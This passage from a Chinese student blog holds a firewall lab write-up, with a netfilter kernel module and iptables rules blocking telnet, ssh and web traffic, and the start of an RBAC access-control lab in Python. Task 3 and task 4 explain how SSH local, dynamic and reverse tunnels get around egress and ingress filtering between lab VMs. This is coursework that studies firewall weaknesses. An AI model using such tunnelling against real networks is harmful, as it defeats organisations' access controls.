class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/netfilter.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/netfilter_ipv4.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/ip.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/tcp.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/inet.h&gt;</span></span><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> <span class="hljs-title">FilterHookRule_1</span>;</span><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> <span class="hljs-title">FilterHookRule_2</span>;</span><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> <span class="hljs-title">FilterHookRule_3</span>;</span><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> <span class="hljs-title">FilterHookRule_4</span>;</span><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> <span class="hljs-title">FilterHookRule_5</span>;</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">eq_daddr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct iphdr *iph, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *ip_addr)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">//check if the dst ip address equals the given address</span>    <span class="hljs-keyword">char</span> source[<span class="hljs-number">16</span>];    <span class="hljs-built_in">snprintf</span>(source, <span class="hljs-number">16</span>, <span class="hljs-string">"%pI4"</span>, &amp;iph-&gt;daddr);    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(source, ip_addr) == <span class="hljs-number">0</span>)        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">eq_saddr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct iphdr *iph, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *ip_addr)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">//check if the src ip address equals the given address</span>    <span class="hljs-keyword">char</span> source[<span class="hljs-number">16</span>];    <span class="hljs-built_in">snprintf</span>(source, <span class="hljs-number">16</span>, <span class="hljs-string">"%pI4"</span>, &amp;iph-&gt;saddr);    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(source, ip_addr) == <span class="hljs-number">0</span>)        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">Filter_1</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * priv, struct sk_buff * skb, <span class="hljs-keyword">const</span>  struct nf_hook_state * state)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">//考虑task1.1规则的实现，防止AtelnetB</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iphdr</span> *<span class="hljs-title">iph</span>;</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcphdr</span> *<span class="hljs-title">tcph</span>;</span>    iph = ip_hdr(skb);    tcph = (<span class="hljs-keyword">void</span> *)iph + iph-&gt;ihl * <span class="hljs-number">4</span>;    <span class="hljs-keyword">if</span> (iph-&gt;protocol == IPPROTO_TCP &amp;&amp; tcph-&gt;dest == htons(<span class="hljs-number">23</span>) &amp;&amp; eq_daddr(iph, <span class="hljs-string">"10.0.2.5"</span>) &amp;&amp; eq_saddr(iph, <span class="hljs-string">"10.0.2.4"</span>))    &#123;        printk(KERN_INFO <span class="hljs-string">"Dropping telnet from %pI4 packet to %pI4\n"</span>, &amp;iph-&gt;saddr, &amp;iph-&gt;daddr);        <span class="hljs-keyword">return</span> NF_DROP;    &#125;    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-keyword">return</span> NF_ACCEPT;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">Filter_2</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * priv, struct sk_buff * skb, <span class="hljs-keyword">const</span>  struct nf_hook_state * state)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">//考虑task1.2规则的实现，防止BtelnetA</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iphdr</span> *<span class="hljs-title">iph</span>;</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcphdr</span> *<span class="hljs-title">tcph</span>;</span>    iph = ip_hdr(skb);    tcph = (<span class="hljs-keyword">void</span> *)iph + iph-&gt;ihl * <span class="hljs-number">4</span>;    <span class="hljs-keyword">if</span> (iph-&gt;protocol == IPPROTO_TCP &amp;&amp; tcph-&gt;dest == htons(<span class="hljs-number">23</span>) &amp;&amp; eq_daddr(iph, <span class="hljs-string">"10.0.2.4"</span>) &amp;&amp; eq_saddr(iph, <span class="hljs-string">"10.0.2.5"</span>))    &#123;        printk(KERN_INFO <span class="hljs-string">"Dropping telnet from %pI4 packet to %pI4\n"</span>, &amp;iph-&gt;saddr, &amp;iph-&gt;daddr);        <span class="hljs-keyword">return</span> NF_DROP;    &#125;    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-keyword">return</span> NF_ACCEPT;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">Filter_3</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * priv, struct sk_buff * skb, <span class="hljs-keyword">const</span>  struct nf_hook_state * state)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">//考虑task1.3规则的实现，防止A访问外部网站,比如百度</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iphdr</span> *<span class="hljs-title">iph</span>;</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcphdr</span> *<span class="hljs-title">tcph</span>;</span>    iph = ip_hdr(skb);    tcph = (<span class="hljs-keyword">void</span> *)iph + iph-&gt;ihl * <span class="hljs-number">4</span>;    <span class="hljs-keyword">if</span> (iph-&gt;protocol == IPPROTO_TCP &amp;&amp; (tcph-&gt;dest == htons(<span class="hljs-number">80</span>) || tcph-&gt;dest == htons(<span class="hljs-number">443</span>)) &amp;&amp; (eq_daddr(iph, <span class="hljs-string">"180.101.49.11"</span>) || eq_daddr(iph, <span class="hljs-string">"180.101.49.12"</span>)) &amp;&amp; eq_saddr(iph, <span class="hljs-string">"10.0.2.4"</span>))    &#123;        printk(KERN_INFO <span class="hljs-string">"Dropping web packet from %pI4 packet to %pI4\n"</span>, &amp;iph-&gt;saddr, &amp;iph-&gt;daddr);        <span class="hljs-keyword">return</span> NF_DROP;    &#125;    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-keyword">return</span> NF_ACCEPT;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">Filter_4</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * priv, struct sk_buff * skb, <span class="hljs-keyword">const</span>  struct nf_hook_state * state)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">//新规则的实现，防止B ssh A</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iphdr</span> *<span class="hljs-title">iph</span>;</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcphdr</span> *<span class="hljs-title">tcph</span>;</span>    iph = ip_hdr(skb);    tcph = (<span class="hljs-keyword">void</span> *)iph + iph-&gt;ihl * <span class="hljs-number">4</span>;    <span class="hljs-keyword">if</span> (iph-&gt;protocol == IPPROTO_TCP &amp;&amp; tcph-&gt;dest == htons(<span class="hljs-number">22</span>) &amp;&amp; eq_daddr(iph, <span class="hljs-string">"10.0.2.4"</span>) &amp;&amp; eq_saddr(iph, <span class="hljs-string">"10.0.2.5"</span>))    &#123;        printk(KERN_INFO <span class="hljs-string">"Dropping ssh from %pI4 packet to %pI4\n"</span>, &amp;iph-&gt;saddr, &amp;iph-&gt;daddr);        <span class="hljs-keyword">return</span> NF_DROP;    &#125;    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-keyword">return</span> NF_ACCEPT;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">Filter_5</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * priv, struct sk_buff * skb, <span class="hljs-keyword">const</span>  struct nf_hook_state * state)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">//新规则的实现，防止A ssh B</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iphdr</span> *<span class="hljs-title">iph</span>;</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcphdr</span> *<span class="hljs-title">tcph</span>;</span>    iph = ip_hdr(skb);    tcph = (<span class="hljs-keyword">void</span> *)iph + iph-&gt;ihl * <span class="hljs-number">4</span>;    <span class="hljs-keyword">if</span> (iph-&gt;protocol == IPPROTO_TCP &amp;&amp; tcph-&gt;dest == htons(<span class="hljs-number">22</span>) &amp;&amp; eq_daddr(iph, <span class="hljs-string">"10.0.2.5"</span>) &amp;&amp; eq_saddr(iph, <span class="hljs-string">"10.0.2.4"</span>))    &#123;        printk(KERN_INFO <span class="hljs-string">"Dropping ssh from %pI4 packet to %pI4\n"</span>, &amp;iph-&gt;saddr, &amp;iph-&gt;daddr);        <span class="hljs-keyword">return</span> NF_DROP;    &#125;    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-keyword">return</span> NF_ACCEPT;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">setUpFilter</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    printk(KERN_INFO <span class="hljs-string">"Registering filters.\n"</span>);    FilterHookRule_1.hook = Filter_1;        <span class="hljs-comment">//对应的function</span>    FilterHookRule_1.hooknum = NF_INET_LOCAL_OUT;  <span class="hljs-comment">//对应OUTPUT链</span>    FilterHookRule_1.pf = PF_INET;    FilterHookRule_1.priority = NF_IP_PRI_FIRST;   <span class="hljs-comment">//优先级</span>    nf_register_hook(&amp;FilterHookRule_1);    FilterHookRule_2.hook = Filter_2;        <span class="hljs-comment">//对应的function</span>    FilterHookRule_2.hooknum = NF_INET_LOCAL_IN;  <span class="hljs-comment">//对应input链</span>    FilterHookRule_2.pf = PF_INET;    FilterHookRule_2.priority = NF_IP_PRI_FIRST;   <span class="hljs-comment">//优先级</span>    nf_register_hook(&amp;FilterHookRule_2);    FilterHookRule_3.hook = Filter_3;        <span class="hljs-comment">//对应的function</span>    FilterHookRule_3.hooknum = NF_INET_LOCAL_OUT;  <span class="hljs-comment">//对应OUTPUT链</span>    FilterHookRule_3.pf = PF_INET;    FilterHookRule_3.priority = NF_IP_PRI_FIRST;   <span class="hljs-comment">//优先级</span>    nf_register_hook(&amp;FilterHookRule_3);    FilterHookRule_4.hook = Filter_4;        <span class="hljs-comment">//对应的function</span>    FilterHookRule_4.hooknum = NF_INET_LOCAL_IN;  <span class="hljs-comment">//对应INPUT链</span>    FilterHookRule_4.pf = PF_INET;    FilterHookRule_4.priority = NF_IP_PRI_FIRST;   <span class="hljs-comment">//优先级</span>    nf_register_hook(&amp;FilterHookRule_4);    FilterHookRule_5.hook = Filter_5;        <span class="hljs-comment">//对应的function</span>    FilterHookRule_5.hooknum = NF_INET_LOCAL_OUT;  <span class="hljs-comment">//对应OUTPUT链</span>    FilterHookRule_5.pf = PF_INET;    FilterHookRule_5.priority = NF_IP_PRI_FIRST;   <span class="hljs-comment">//优先级</span>    nf_register_hook(&amp;FilterHookRule_5);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">removeFilter</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    nf_unregister_hook(&amp;FilterHookRule_1);    nf_unregister_hook(&amp;FilterHookRule_2);    nf_unregister_hook(&amp;FilterHookRule_3);    nf_unregister_hook(&amp;FilterHookRule_4);    nf_unregister_hook(&amp;FilterHookRule_5);&#125;module_init(setUpFilter);module_exit(removeFilter);MODULE_LICENSE(<span class="hljs-string">"GPL"</span>);</code></pre><h4 id="task2复盘"><a href="#task2复盘" class="headerlink" title="task2复盘"></a>task2复盘</h4><p>文件夹命名尽量不要带空格，makefile哭泣</p><p>其实这个task的思路还是比较简单的，本质上来讲就是当满足对应的条件（匹配条件if）的时候，来完成相应的东作用（drop）。其实是引入的比较新的东西的话也就是LKM和netfilter的与挂钩点register的东西，不存在理解上面的难点</p><h3 id="task3：规避出口过滤"><a href="#task3：规避出口过滤" class="headerlink" title="task3：规避出口过滤"></a>task3：规避出口过滤</h3><h4 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h4><blockquote><p>we show how such egress filtering can be bypassed using the tunnel mechanism. There are many ways to establish tunnels; in this task, we only focus on SSH tunnels.</p></blockquote><h4 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h4><h5 id="设置iptables来屏蔽对应的telnet连接和发往www-fudan-edu-cn主机的数据包"><a href="#设置iptables来屏蔽对应的telnet连接和发往www-fudan-edu-cn主机的数据包" class="headerlink" title="设置iptables来屏蔽对应的telnet连接和发往www.fudan.edu.cn主机的数据包"></a>设置iptables来屏蔽对应的telnet连接和发往<a href="http://www.fudan.edu.cn主机的数据包" target="_blank" rel="noopener">www.fudan.edu.cn主机的数据包</a></h5><p>首先，查看现在的filter表并且查询<a href="http://www.fudan.edu.cn的IP地址，发现是202.120.224.81" target="_blank" rel="noopener">www.fudan.edu.cn的IP地址，发现是202.120.224.81</a></p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/3-1.PNG" srcset="/img/loading.gif" alt="3-1"></p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p><p>之后运行下面两条命令</p><pre><code class="hljs angelscript">sudo iptables -A OUTPUT -s <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.4</span> -p tcp --dport <span class="hljs-number">23</span> -j DROPsudo iptables -A OUTPUT -s <span class="hljs-number">10.0</span><span class="hljs-number">.2</span><span class="hljs-number">.4</span> -d <span class="hljs-number">202.120</span><span class="hljs-number">.224</span><span class="hljs-number">.81</span> -j DROP</code></pre><p>之后查看filter表</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/3-3.PNG" srcset="/img/loading.gif" alt="3-3"></p><h5 id="task3-a：建立穿过防火墙的隧道"><a href="#task3-a：建立穿过防火墙的隧道" class="headerlink" title="task3.a：建立穿过防火墙的隧道"></a>task3.a：建立穿过防火墙的隧道</h5><p><img src="/2020/11/30/Linuc-Firewall-Exploration/3-4.PNG" srcset="/img/loading.gif" alt="3-4"></p><p>在这个task里面，我只采用了两个VM来实现，首先，当我们直接telnet B（10.0.2.5）的时候，会发现不能成功</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/3-5.PNG" srcset="/img/loading.gif" alt="3-5"></p><p>之后运行下面的命令来建立A（端口为8000）和B（端口22）之间的ssh连接，并且设置B转发到本机的23端口</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/3-6.PNG" srcset="/img/loading.gif" alt="3-6"></p><p>这时候已经建立好了ssh连接，当A上面从端口8000发送过去的数据包到达B的22端口的时候，B会转发到23端口，所以之后我们在主机A上面运行telnet localhost 8000的时候，从本质上来讲，是在将端口与localhost 8000发送TCP包来建立telnet连接，但是之后端口8000收到TCP数据包之后并不用来建立telnet连接，而是利用ssh隧道来实现转发，这时候wireshark抓包可以看见，并没有telnet数据包，而是ssh数据包</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/3-7.PNG" srcset="/img/loading.gif" alt="3-7"></p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/3-9.PNG" srcset="/img/loading.gif" alt="3-9"></p><h5 id="task3-b：通过ssh隧道来访问外部网站（以www-fudan-edu-cn为例）"><a href="#task3-b：通过ssh隧道来访问外部网站（以www-fudan-edu-cn为例）" class="headerlink" title="task3.b：通过ssh隧道来访问外部网站（以www.fudan.edu.cn为例）"></a>task3.b：通过ssh隧道来访问外部网站（以<a href="http://www.fudan.edu.cn为例）" target="_blank" rel="noopener">www.fudan.edu.cn为例）</a></h5><p>使用了<strong>动态端口转发</strong>：当数据包到达VM B的时候，并不是静态的转发到目的地IP，而是根据包的信息来决定目的地</p><ul><li><p>将本地端口9000与B主机22端口建立ssh隧道</p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/3-10.PNG" srcset="/img/loading.gif" alt="3-10"></p><p>  此时本地端口与B主机的22端口已经建立好了连接，之后就是浏览器与本地9000的连接的建立</p></li><li><p>建立浏览器连接</p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/3-11.PNG" srcset="/img/loading.gif" alt="3-11"></p></li><li><p>访问以及抓包观察</p><p>  我们可以看到，访问<a href="http://www.fudan.edu.cn成功，并且通过抓数据包可以看到并不是通过10.0.2.4来直接进行访问202.120.224.81的，而是通过ssh连接来让B进行访问" target="_blank" rel="noopener">www.fudan.edu.cn成功，并且通过抓数据包可以看到并不是通过10.0.2.4来直接进行访问202.120.224.81的，而是通过ssh连接来让B进行访问</a></p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/3-13.PNG" srcset="/img/loading.gif" alt="3-13"></p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/3-12.PNG" srcset="/img/loading.gif" alt="3-12"></p><p>  同时，当经过ssh隧道，由于并不在是直接访问对应IP，而是通过ssh连接来访问，所以绕过了防火墙，同时我们结合上面的图来一起分析，可以看到A到B是通过ssh，而B到对应的web服务器是通过http连接</p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/3-14.PNG" srcset="/img/loading.gif" alt="3-14"></p><p>  之后断开ssh连接并且清除缓存，此时发现代理拒绝连接</p><p>  <img src="/2020/11/30/Linuc-Firewall-Exploration/3-15.PNG" srcset="/img/loading.gif" alt="3-15"></p><p>  之后当我们重新家里ssh隧道之后，我们又可以看到对应界面，就和之前访问成功的时候一样</p></li></ul><h3 id="task4：规避进入过滤"><a href="#task4：规避进入过滤" class="headerlink" title="task4：规避进入过滤"></a>task4：规避进入过滤</h3><p>首先是要进行访问的内部网络的网络页面</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/4-1.PNG" srcset="/img/loading.gif" alt="4-1"></p><p>下面是要输入的防火墙的INPUT里面的规则以及此时防火墙filter表中的规则</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/4-2.PNG" srcset="/img/loading.gif" alt="4-2"></p><p>之后我们无法通过建立ssh连接以及http进行访问，因为这时候从外部进行访问的ssh连接也被屏蔽掉了，之后我们需要建立一个reverse连接，原理是此时并不制止从内部发往外部的ssh连接，我们建立了反向ssh隧道</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/4-3.PNG" srcset="/img/loading.gif" alt="4-3"></p><p>此时A的80端口已经与远程端的8000端口建立了连接，并且进行转发的主机是10.0.2.5</p><p>之后可以看到，成功访问</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/4-4.PNG" srcset="/img/loading.gif" alt="4-4"></p><p>原理示意图：</p><p><img src="/2020/11/30/Linuc-Firewall-Exploration/4-5.PNG" srcset="/img/loading.gif" alt="4-5"></p><p>参考blog：<a href="https://github.com/li-xin-yi/seedlab/tree/master/Firewall-Exploration" target="_blank" rel="noopener">reverse ssh在最后</a>、<a href="https://unix.stackexchange.com/questions/46235/how-does-reverse-ssh-tunneling-work" target="_blank" rel="noopener">how does the reverse tunnel work</a></p><h2 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h2><p>这个lab给我的感觉就是太过于狭小、太偏向于技术层面而失去了对于整体系统的把握，虽然能够对于iptables这一种防火墙有所了解，但是对于所有的防火墙的认知还是有一点匮乏，其中task3和task4有比较好的理解，task2其实感觉就是task1的一种具体实现</p>]]></content>
    
    
    
    <tags>
      
      <tag>Network Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RBAC访问控制</title>
    <link href="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/"/>
    <url>/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="RBAC访问控制实验"><a href="#RBAC访问控制实验" class="headerlink" title="RBAC访问控制实验"></a>RBAC访问控制实验</h1><h2 id="RBAC简介"><a href="#RBAC简介" class="headerlink" title="RBAC简介"></a>RBAC简介</h2><p>RBAC（Role-based Access Control）基于角色的访问控制模型，从根本上来讲是解决资源的控制的问题，而在这里所提出的解决方案是who、what以及how的解决方式，其中who是指权限的拥有者或者主体（user，role）而what就是资源或者对象，可以抽象为who对what进行来how操作</p><blockquote><p>RBAC其实是一种分析模型，主要分为：基本模型RBAC0（Core RBAC）、角色分层模型RBAC1（Hierarchal RBAC）、角色限制模型RBAC2（Constraint RBAC）和统一模型RBAC3（Combines RBAC）。</p></blockquote><h3 id="RBAC0"><a href="#RBAC0" class="headerlink" title="RBAC0"></a>RBAC0</h3><p>由四部分组成：用户、角色、会话和许可，</p><p><img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p><h3 id="RBAC1（角色分层模型）"><a href="#RBAC1（角色分层模型）" class="headerlink" title="RBAC1（角色分层模型）"></a>RBAC1（角色分层模型）</h3><p>在RBAC0的基础上引入了角色的继承，使得角色具有了上下级的关系，例如下图</p><p><img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/1-2.PNG" srcset="/img/loading.gif" alt="1-2"></p><p><img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/1-4.PNG" srcset="/img/loading.gif" alt="1-4"></p><h3 id="RBAC2（约束模型）"><a href="#RBAC2（约束模型）" class="headerlink" title="RBAC2（约束模型）"></a>RBAC2（约束模型）</h3><p>加入了约束的概念，并且引入了静态职责分离SSD(Static Separation of Duty)和动态职责分离DSD(Dynamic Separation of Duty)</p><blockquote><p><strong>SSD是用户和角色的指派阶段加入的，主要是对用户和角色有如下约束:</strong></p><ul><li>a、互斥角色：同一个用户在两个互斥角色中只能选择一个</li><li>b、基数约束：一个用户拥有的角色是有限的，一个角色拥有的许可也是有限的</li><li>c、先决条件约束：用户想要获得高级角色，首先必须拥有低级角色</li></ul><p><strong>DSD是会话和角色之间的约束，可以动态的约束用户拥有的角色，如一个用户可以拥有两个角色，但是运行时只能激活一个角色。</strong></p></blockquote><p><img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/1-3.PNG" srcset="/img/loading.gif" alt="1-3"></p><h3 id="RBAC3（RBAC1-RBAC2）"><a href="#RBAC3（RBAC1-RBAC2）" class="headerlink" title="RBAC3（RBAC1 + RBAC2）"></a>RBAC3（RBAC1 + RBAC2）</h3><p><img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/1-5.PNG" srcset="/img/loading.gif" alt="1-5"></p><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><p>原始框架</p><p><img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/2-1.png" srcset="/img/loading.gif" alt="2-1"></p><h3 id="主体、角色、权限的定义以及相应配置"><a href="#主体、角色、权限的定义以及相应配置" class="headerlink" title="主体、角色、权限的定义以及相应配置"></a>主体、角色、权限的定义以及相应配置</h3><p>在这个例子当中，主体/用户是A、B、M1、C、D、M2以及BOSS，而相应的角色分为了第一类员工（A、B），部门经理（M1），第二类员工（C、D），经理（M2）以及BOSS，对应的权限就是读取，执行；读取、删除、执行；新建、读取、更改；新建、删除、读取、更改；所有权限</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>在运行的本文件的时候，<strong>管理员账户密码为1234</strong></p><p>其次，我参考了一些网上方法，采用的是数据库的格式，所以每次运行完的结果都会存在对应的db文件中，可以通过<strong>新建txt并且重新命名为datatable.db来重新初始化</strong></p><p>最后，由于是花了几天时间实现的，所以<strong>不同地方的注释和print出来的东西有中文有英文</strong>，但是都是自己验证通过的</p><h3 id="设计文档"><a href="#设计文档" class="headerlink" title="设计文档"></a>设计文档</h3><ul><li><p>设计思路：</p><p>  <img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/3-2.PNG" srcset="/img/loading.gif" alt="3-2"></p><p>  在这里我希望采用三个对象来对于用户、角色还有权限进行分别管理，同时，我才用了sqlite包来帮助实现对应的db文件中的几个表，而对于用户/角色/权限的一些操作，是通过这三个类里面的函数来进行实现的，下面来对不同的类进行分别解释</p></li><li><p><strong>对用户管理的类usermanager（）</strong></p><p>  包含的方法以及所要完成的功能/作用：</p><table><thead><tr><th align="center">函数</th><th align="center">函数的功能/作用</th></tr></thead><tbody><tr><td align="center">set_user_table（）</td><td align="center">初始化对应的user表，实现例子里面的内容</td></tr><tr><td align="center">set_user_role_table（）</td><td align="center">初始化对应的用户角色关联表</td></tr><tr><td align="center">add_user_role（）</td><td align="center">这是在添加用户的时候所需要用到的，要了解想要添加的用户的角色id</td></tr><tr><td align="center">user_info（）</td><td align="center">获取所要添加的用户的名称以及用户id</td></tr><tr><td align="center">add_user（）</td><td align="center">在用户表里面检索，符合要求时添加对应的表项</td></tr><tr><td align="center">user_name_show（）</td><td align="center">显示用户的信息的时候用到的</td></tr></tbody></table><p>  <strong>具体代码实现</strong></p>  <pre><code class="hljs python"><span class="hljs-keyword">import</span> sqlite3<span class="hljs-comment">#初始化对于用户管理的类</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">usermanager</span><span class="hljs-params">()</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span>        super().__init__()    <span class="hljs-comment">#该方法用于设置对应的用户表</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_user_table</span><span class="hljs-params">(self)</span>:</span>        <span class="hljs-comment">#建立连接和游标对象</span>        con = sqlite3.connect(<span class="hljs-string">"d:/Information System Security/RBAC/datatable.db"</span>)        cur = con.cursor()        sql = <span class="hljs-string">'insert into user(user_name,user_id) values(?,?)'</span>        <span class="hljs-keyword">try</span>:            cur.executemany(sql,[(<span class="hljs-string">"员工A"</span>,<span class="hljs-number">1</span>),(<span class="hljs-string">"员工B"</span>,<span class="hljs-number">2</span>),(<span class="hljs-string">"员工C"</span>,<span class="hljs-number">3</span>),(<span class="hljs-string">"员工D"</span>,<span class="hljs-number">4</span>),(<span class="hljs-string">"部门经理M1"</span>,<span class="hljs-number">5</span>),(<span class="hljs-string">"部门经理M2"</span>,<span class="hljs-number">6</span>),(<span class="hljs-string">"Boss"</span>,<span class="hljs-number">7</span>)])            con.commit()            print(<span class="hljs-string">"用户表设置成功"</span>)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            print(e)            con.rollback()            print(<span class="hljs-string">"设置用户表失败"</span>)        <span class="hljs-keyword">finally</span>:            cur.close()            con.close()            <span class="hljs-comment">#该方法用于设置对应的用户角色关联表</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_user_role_table</span><span class="hljs-params">(self)</span>:</span>        con=sqlite3.connect(<span class="hljs-string">"d:/Information System Security/RBAC/datatable.db"</span>)        cur=con.cursor()        sql=<span class="hljs-string">'insert into user_role(user_id,role_id) values(?,?)'</span>        <span class="hljs-keyword">try</span>:            cur.executemany(sql,[(<span class="hljs-number">1</span>,<span class="hljs-number">101</span>),(<span class="hljs-number">2</span>,<span class="hljs-number">101</span>),(<span class="hljs-number">3</span>,<span class="hljs-number">201</span>),(<span class="hljs-number">4</span>,<span class="hljs-number">201</span>),(<span class="hljs-number">5</span>,<span class="hljs-number">100</span>),(<span class="hljs-number">6</span>,<span class="hljs-number">200</span>),(<span class="hljs-number">7</span>,<span class="hljs-number">404</span>)])            con.commit()            print(<span class="hljs-string">"用户角色关联表设置成功"</span>)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            print(e)            con.rollback()            print(<span class="hljs-string">"用户角色关联表设置失败"</span>)        <span class="hljs-keyword">finally</span>:            cur.close()            con.close()    <span class="hljs-comment">#该方法用于管理/增加用户角色关联表里面的内容</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_user_role</span><span class="hljs-params">(self)</span>:</span>        print(<span 